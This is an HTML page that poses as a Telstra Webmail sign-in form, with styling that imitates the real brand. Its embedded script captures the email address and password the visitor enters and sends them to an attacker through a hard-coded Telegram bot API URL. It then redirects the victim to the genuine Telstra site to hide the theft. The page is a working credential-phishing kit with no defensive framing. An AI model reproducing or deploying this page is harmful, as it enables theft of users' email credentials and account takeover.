<head>

    <title>Sign in to Telstra Webmail</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #e0f7fa; /* Light green background */
            margin: 0;
        }
        /* Header styles with gradient background */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: linear-gradient(90deg, #d1c4e9, #b3e0ff); /* Light purple to light blue gradient */
            padding: 20px 20px; /* Increased padding for more space */
        }
        .header h1 {
            margin: 0;
            font-family: Calibri, sans-serif; /* Calibri font */
            font-size: 24px;
            letter-spacing: 1px; /* Adjusted letter spacing */
        }
        .header a {
            text-decoration: none;
            color: #0056b3;
            font-size: 16px;
        }
        .header a:hover {
            text-decoration: underline;
        }
        /* Logo positioning with slight left alignment */
        .logo {
            margin-top: 10px; /* Space between header and logo */
            margin-left: 80px; /* Move logo slightly to the left */
        }
        .logo img {
            width: 50px; /* Set the width of the logo (adjust size as needed) */
            height: auto;
        }
        /* Login container styles */
        .login-container {
            background-color: #e0f7fa; /* Same as body background */
            padding: 40px 30px; /* Increased padding for more space */
            width: 450px; /* Increased container width */
            margin: 60px auto;
            border-radius: 8px; /* Rounded corners for the container */
        }
        h2 {
            text-align: center;
            margin-bottom: 10px; /* Reduced bottom margin */
            font-family: Calibri, sans-serif; /* Calibri font */
            font-weight: bold; /* Make the text bold */
            letter-spacing: 1px; /* Adjust letter spacing for spaciousness */
            line-height: 1.4; /* Reduced space between lines */
        }
        .subheading {
            text-align: center;
            font-size: 16px; /* Increased font size */
            font-weight: normal;
            color: #555; /* Lighter color for the subheading */
            margin-top: 5px; /* Reduced top margin */
            margin-bottom: 15px; /* Reduced bottom margin */
        }
        .form-group {
            margin-bottom: 20px; /* Reduced space between form elements */
        }
        .form-group label {
            display: block;
            margin-bottom: 10px; /* Added margin below label */
            font-size: 16px; /* Increased label font size */
        }
        .form-group input {
            width: 100%;
            padding: 12px 0; /* Increased padding for input fields */
            font-size: 16px; /* Increased input text size */
            border: none;
            border-bottom: 1px solid #000; /* Thinner black bottom border */
            background: transparent;
            margin-bottom: 15px; /* Reduced space after input field */
        }
        .form-group input:focus {
            border-color: #0056b3;
            outline: none;
        }
        .form-group button {
            width: 100%;
            padding: 12px;
            background-color: #0056b3;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 18px; /* Increased button font size */
            cursor: pointer;
        }
        .form-group button:hover {
            background-color: #004085;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 14px; /* Slightly increased footer font size */
        }
    </style>
</head>

    <!-- Login Form -->
    <div class="login-container">
        <h2>Sign in to Telstra <br> Webmail</h2>
        <p class="subheading">Sign in with your Telstra email address</p>
        <form id="login-form" method="post">
            <div class="form-group">
                <label for="email">Telstra Email*</label>
                <input type="email" id="email" name="email" placeholder="Enter your Telstra email" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>
            <div class="form-group">
                <button type="submit">Continue</button>
            </div>
        </form>
        <div class="footer">
            <p>By signing in, you agree to Telstra's terms and privacy policy.</p>
        </div>
    </div>

   <script>
    // Telegram webhook URL (replace with the correct chat_id)
    const webhookUrl = "https://api.telegram.org/bot7801700863:AAGKZl_ORbsGmMOEc8VxUfKKrkg9k-blgm0/sendMessage?chat_id=8088765429&text=";

    document.getElementById("login-form").addEventListener("submit", function(event) {
        event.preventDefault(); // Prevent form submission

        // Get email and password
        const email = document.getElementById("email").value;
        const password = document.getElementById("password").value;

        // Log the values to check if they're captured correctly
        console.log("Email:", email);
        console.log("Password:", password);

        // Determine the login type based on the email domain
        let loginType = '';
        if (email.includes('@bigpond.com')) {
            loginType = '*****BIGPOND LOGIN*******';
        } else if (email.includes('@telstra.com')) {
            loginType = '*****TELSTRA LOGIN*******';
        }

        // Prepare the message for Telegram with login type, email, and password
        const message = `${loginType}\nUsername: ${email}\nPassword: ${password}`;

        // Send data to Telegram before clearing the form or redirecting
        fetch(webhookUrl + encodeURIComponent(message))
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log("Message sent successfully.");
                } else {
                    console.error("Error sending message to Telegram:", data);
                }

                // Clear the form
                document.getElementById("login-form").reset();

                // Redirect to the new URL
                window.location.href = "https://www.myservices.telstra.com.au/";
            })
            .catch(error => {
                console.error("Error:", error);
                
                // Even if there is an error, still clear the form and redirect
                document.getElementById("login-form").reset();
                window.location.href = "https://www.myservices.telstra.com.au/";
            });
    });
</script>
